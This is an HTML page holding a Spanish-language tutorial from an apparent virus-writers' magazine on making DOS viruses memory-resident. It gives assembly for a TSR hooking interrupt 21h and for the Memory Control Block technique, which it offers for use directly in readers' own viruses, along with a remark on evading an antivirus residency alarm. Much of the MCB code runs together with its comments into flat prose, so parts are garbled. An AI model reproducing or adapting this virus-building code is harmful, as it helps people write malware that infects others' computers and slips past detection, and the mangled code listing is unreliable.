<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./CURSO4copy_archivos/filelist.xml">
<link rel=Edit-Time-Data href="./CURSO4copy_archivos/editdata.mso">
<!--[if !mso]>
<style>
v\:* {behavior:url(#default#VML);}
o\:* {behavior:url(#default#VML);}
w\:* {behavior:url(#default#VML);}
.shape {behavior:url(#default#VML);}
</style>
<![endif]-->
<title> nEUrOtIc cpU. (La residencia.)</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Microsoft</o:Author>
  <o:LastAuthor>Microsoft</o:LastAuthor>
  <o:Revision>13</o:Revision>
  <o:TotalTime>17</o:TotalTime>
  <o:Created>2004-01-19T19:52:00Z</o:Created>
  <o:LastSaved>2004-01-19T20:06:00Z</o:LastSaved>
  <o:Pages>4</o:Pages>
  <o:Words>1296</o:Words>
  <o:Characters>7389</o:Characters>
  <o:Company>Familiar</o:Company>
  <o:Lines>61</o:Lines>
  <o:Paragraphs>14</o:Paragraphs>
  <o:CharactersWithSpaces>9074</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:Zoom>75</w:Zoom>
  <w:HyphenationZone>21</w:HyphenationZone>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
 /* Font Definitions */
@font-face
	{font-family:Wingdings;
	panose-1:5 0 0 0 0 0 0 0 0 0;
	mso-font-charset:2;
	mso-generic-font-family:auto;
	mso-font-pitch:variable;
	mso-font-signature:0 268435456 0 0 -2147483648 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:black;}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;
	text-underline:single;}
a:visited, span.MsoHyperlinkFollowed
	{color:#551A8B;
	text-decoration:underline;
	text-underline:single;}
pre
	{margin:0cm;
	margin-bottom:.0001pt;
	font-size:10.0pt;
	font-family:"Courier New";
	mso-fareast-font-family:"Courier New";
	color:black;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:70.85pt 3.0cm 70.85pt 3.0cm;
	mso-header-margin:35.4pt;
	mso-footer-margin:35.4pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1027"/>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor=white lang=ES link=blue vlink="#551a8b" style='tab-interval:35.4pt'
alink="#FF0000">

<div class=Section1><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -&nbsp;&nbsp; INSTALACION DE UN VIRUS EN LA MEMORIA DEL ORDENADOR&nbsp;&nbsp; -</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre
style='margin-left:45.8pt;text-indent:-45.8pt'>-------------------------------------------------------------------------------</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Este artículo intenta explicar los métodos mas usados de residencia,&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>con un enfoque mas práctico que teórico, dejando en claro lo fundamental para</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>poder aprovecharlos, en especial el de MCB. Muestra ejemplos de los 2 tipos de&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>técnicas descritos, que pueden (en el caso del MCB) usarse directamente</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>en sus propios virus.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>La teoría no esta muy detallada, pero se encontrará&nbsp; todo lo necesario para</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>que el novato comprenda y pueda usar estos métodos. Y con la información</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>del articulo, si desea profundizar la teoría, es sólo cuestión de leer alguna</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>guía o manual, que hable sobre la memoria, ya que aquí se explica lo básico</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>necesario (espero...).</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Empezemos:</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Los métodos más usados para dejar a un virus residente son:&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>los que el DOS proporciona o el método de MCB (Memory Control Block).</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>La primera forma es la más simple, pero también la mas ineficaz,</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>primero porque le informa al DOS que se esta dejando algo residente... además&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>al ejecutarse esa función retorna el control al DOS. El programa que se&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>intente ejecutar termina!. El virus que use esta técnica para evitar salir&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>al DOS en su instalacion en memoria tiene que reejecutarse. Para quedar&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>residente, se ejecuta a si mismo otra vez (serv. 4bh), y en su segunda&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>ejecución ejecuta una int 27h o llama al servicio 31 de la int. 21h, esta a su&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>vez, le da el control al programa padre, al que se cargo primero, y este&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>puede entonces terminar, ejecutando al anfitrión.&nbsp; Si esto no se hiciera, al</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>ejecutar una int 21, por ejemplo, se le cedería el control al interprete de&nbsp;</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>comandos...</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Una de las característica de los virus que usan esta técnica es que</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>suelen colocarse al principio de los archivos, estos servicios dejaran</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>residente la cantidad de parrafeo que se les indique desde el comienzo del</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>programa en memoria... Si tenemos un COM de 50K y el virus al final, al</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>usar la int 27h, y dejar residente, por ejemplo, 1k, lo que quedaria seria</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>el primer K del COM, no el virus que esta al final....</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Es evidente que no pondemos dejar 50k&nbsp; residentes... para que el virus quede</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>en memoria se puede relocar(mover), a otro bloque, tranferirle el control, y</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>luego este le cederá el control al programa padre...</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Para evitar esto, muchos se colocan al principio del programa que infectan.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Claro que esto es lento, porque hay que leer todo el file, y luego escribirlo</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>después del virus, lo que no pasa si va al final, en ese caso solo hay que</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>escribir el virus, no el virus y el archivo!.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Este método es poco elegante, ademas de lento si se infecta dejando el virus</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>al comienzo, entre otras cosas...</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Abajo, sigue un fuente de un TSR, no de un virus!, solo un TSR normal</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>para ilustrar su funcionamiento.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>Este ejemplo intercepta la int. 21 y luego le pasa el control sin</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>hacer nada. Se le puede agregar el código para hacer lo que se quiera.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>===============================================================================<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>===============================================================================<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>code&nbsp;&nbsp;&nbsp; segment&nbsp;<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; assume cs:code,ds:code<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; org&nbsp;&nbsp; 100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>start:<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>jmp&nbsp;&nbsp;&nbsp;&nbsp; instalar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;Salta a la rutina de</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;instalacion.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>;En esta variable va la direccion original de la int 21h.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>old_21&nbsp; dd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>new_21:<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre>;Aca va la rutina que se cuelga de la interrupcion 21h.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp; cs:[old_21]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;Salta a la int original.</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>instalar:</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>;Obtengo el vector original de la int 21</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span
lang=EN-US style='mso-ansi-language:EN-US'>mov&nbsp;&nbsp;&nbsp;&nbsp; ax, 3521h<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; word ptr old_21, bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; word ptr old_21+2, es&nbsp;&nbsp;&nbsp;<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre>;Seteo el nuevo&nbsp; vector de la int 21</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span
lang=EN-US style='mso-ansi-language:EN-US'>mov&nbsp;&nbsp;&nbsp;&nbsp; ax,2521h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; cs<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; ds<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dx, offset new_21<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>int&nbsp;&nbsp;&nbsp;&nbsp; 21h</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>;Queda residente</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ah, 31h</pre><pre><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; dx, 30d&nbsp; ;<span
style='font-family:Wingdings;mso-ascii-font-family:"Courier New";mso-hansi-font-family:
"Courier New";mso-char-type:symbol;mso-symbol-font-family:Wingdings'><span
style='mso-char-type:symbol;mso-symbol-font-family:Wingdings'>ß</span></span>-- Cantidad de parrafeo(16 bytes) a dejar int 21h ; residentes.</pre><pre><span
style='mso-tab-count:4'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span
lang=EN-US style='mso-ansi-language:EN-US'>code ends end star<o:p></o:p></span></pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></pre><pre>El segundo método es el de MCB, este es un poco mas complejo que simplemente llamar a al int</pre><pre>27h,pero es mucho mas eficaz. Para entender como funciona hay que saber que el dos crea un</pre><pre>bloque de control por cada bloque de memoria que use, este bloque de control, mide 16 bytes,</pre><pre>un parrafo y esta justo por encima del bloque de memoria asignado. En un .COM, por ejemplo,</pre><pre>en cs - 1, esta la dirección de este bloque. En el offset 3 del mismo esta la cantidad de</pre><pre>memoria usada por ese programa..., para poder dejar residente un prog. hay que restarle a ese</pre><pre>valor la longitud del virus, luego liberar la memoria que ya no usa (servicio 4ah) y asignarla</pre><pre>(servicio 48h) a nuesto prog. Para terminar, marcamos el MCB del segmento al que movimos nuestro</pre><pre>virus con '8' en el offset 1, para que el dos piense que es parte suya y no use esa memoria. En</pre><pre>ese offset se coloca una marca, para identificar al bloaque, para esta rutina usamos 8 poruque</pre><pre>es el que usa el DOS. El código que sigue muestra como se hace... Este code sirve para dejar un</pre><pre>virus residente desde un COM, si se carga desde un EXE hay que tener en cuanta que el segmento</pre><pre>del MCB a modificar lo obtenemos de restarle 1 a DS y no a CS.;Paso a AX el Code Segment, lo</pre><pre>decremento y paso a ES, para obtener; la memoria reservada por el programa anfitrión (ES:[3]),</pre><pre>que queda en AX... mov ax, cs ;Con esto obtenemos el segmento dec ax ;del MCB. mov es, ax ;Aca</pre><pre>estamos obteniendo del campo mov ax, es:[3] ;del MCB, la memoria utilizada. ;Resto a la memoria</pre><pre>usada por el anfitrión la longitud del virus, el resultado ;en AX. sub ax, bx ;En BX esta la</pre><pre>longitud del virus, ;en parrafos. ;Paso el resultado de la operacion anterior a BX, para después</pre><pre>llamar al ;servicio de liberar memoria, que se llama com BX, con el nuevo tamaño y con ;el</pre><pre>asegmento en ES. push bx ;Salvo la cantidad de mem a reservar. mov bx, ax ;Le paso la nueva</pre><pre>cantidad a BX. push cs pop es mov ah,4ah int 21h ;Asigno la memoria liberada a mi virus, el</pre><pre>segmento de la memoria asignada ;queda en AX. Decremento BX porque un parrafo lo va a usar el</pre><pre>DOS.... pop bx ;Popeo la cantidad de mem a reservar. dec bx mov ah, 48h int 21h ;Decremento AX,</pre><pre>Y lo paso a ES, de esa forma apunto al parrafo que usa el DOS ;como control, marco ese parrfo en</pre><pre>El offset 1 con 8, para que el DOS lo ;considere como parte suya y no utilize esa zona de memoria.</pre><pre>;Después incremento AX otra vez y lo paso a ES, para que ES quede apuntando ;a la memoria que el</pre><pre>virus usara. dec ax mov es, ax mov word ptr es:[1], 8 mov word ptr es:[8],'XX' ;Opcional, un</pre><pre>nombre al bloque. inc ax mov es, ax push es ;Salvo la dir del seg Del virus Ahora lo que queda es</pre><pre>mover el virus al segmento reservado, esto es cuestión de hacer un rep movsb al segmento al que</pre><pre>apunta ES y listo, el virus esta residente. NOTA: La rutina en si no hace saltar ninguna alarma,</pre><pre>la alarma de residencia del TB salta cuando detecta la actualizacion de la int 21h o 13h. Fé de</pre><pre>Ratas.. ;) - mov ax, cs ;Con esto obtenemos el segmento dec ax ;del MCB. mov es, ax ;Aca estamos</pre><pre>obteniendo del campo mov ax, es:[3] ;del MCB, la memoria utilizada. ;**** ;El problema de esto,</pre><pre>es que en ningún momento se aclara que tenemos que decla_ ;rar el tamaño del virus un poco mas</pre><pre>grande, exactamente un parrafo mas largo. ;Esto por qué ? Y bueno, en el momento en que tenemos</pre><pre>que restarle un parrafo a ;la memoria que queremos reservar (esto lo haciamos para dar lugar a</pre><pre>que se ;cree el MCB del nuevo bloque), estamos reservando un parrafo menos de virus ;también..</pre><pre>osea que la última parte del virus no entraría en la memoria reser_ ;vada.. Puede ser que no</pre><pre>traiga problemas por ser un&nbsp; rea de datos o algo por ;el estilo, pero es aconsejable hacer las</pre><pre>cosas bien, o no ? ;-) ;Bueno, la manera de solucionar esto es simplemente INCrementar la cantidad</pre><pre>de ;parrafos del virus o si lo declaran en su programa con un : ; ; TAMANO_EN_PARRAFOS EQU</pre><pre>((FIN-COMIENZO)/16)+1 ; ; declarar el incremento directamente ahi, para no gastar bytes ni</pre><pre>clocks ;) : ; ; TAMANO_EN_PARRAFOS EQU ((FIN-COMIENZO+15)/16)+1 ; ;**** sub ax, bx ;En BX esta</pre><pre>la longitud del virus, ;en parrafos. (ahora incrementada). push bx ;Salvo la cantidad de mem a</pre><pre>reservar. mov bx, ax ;Le paso la nueva cantidad a BX. push cs pop es mov ah, 4ah int 21h pop bx ;</pre><pre>Popeo la cantidad de mem a reservar. dec bx mov ah, 48h int 21h dec ax mov es, ax mov word ptr </pre><pre>es:[1], 8 mov word ptr es:[8],'XX' ;Opcional, un nombre al bloque. inc ax mov es, ax push es ;Salvo</pre><pre>la dir del seg. del virus ... ;blah blah blah y sigue el código ;) ...DTM - Dead to Minotauro BBS</pre><pre><span
lang=EN-US style='mso-ansi-language:EN-US'>silly Troyan installer. Text by Zarathustra for Minotauro Magazine.</span><span
lang=EN-US style='font-size:16.0pt;mso-bidi-font-size:10.0pt;mso-ansi-language:
EN-US'><o:p></o:p></span></pre>

<p class=MsoNormal><a href="neurotic.htm"><span style='text-decoration:none;
text-underline:none'><img border=0 width=32 height=32 id="_x0000_i1029"
src=forward.jpg></span></a></p>

</div>

</body>

</html>
